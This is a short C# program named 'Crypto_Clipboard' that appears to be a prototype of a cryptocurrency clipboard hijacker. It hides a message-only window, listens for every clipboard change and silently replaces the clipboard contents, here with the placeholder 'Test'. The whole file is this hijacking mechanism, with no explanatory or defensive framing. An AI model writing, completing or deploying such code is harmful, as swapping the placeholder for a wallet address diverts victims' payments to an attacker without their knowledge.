using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Crypto_Clipboard
{
    static class Program
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        [STAThread]
        public static void Main()
        {
            new Thread(() => { Run(); }).Start();
        }

        public static void Run()
        {
            Application.Run(new ClipboardManager.ClipboardForm());
        }
    }

    public sealed class ClipboardManager
    {
        public class ClipboardForm : Form
        {
            public ClipboardForm()
            {
                Program.SetParent(Handle, Program.HWND_MESSAGE);
                Program.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == Program.WM_CLIPBOARDUPDATE)
                {

                    Thread STAThread = new Thread(
                        delegate ()
                        {
                            try
                            {
                                System.Windows.Forms.Clipboard.SetText("Test");
                            }
                            catch (Exception) { }

                        });

                    STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
                    STAThread.Start();
                    STAThread.Join();

                }
                base.WndProc(ref m);
            }
        }
    }
}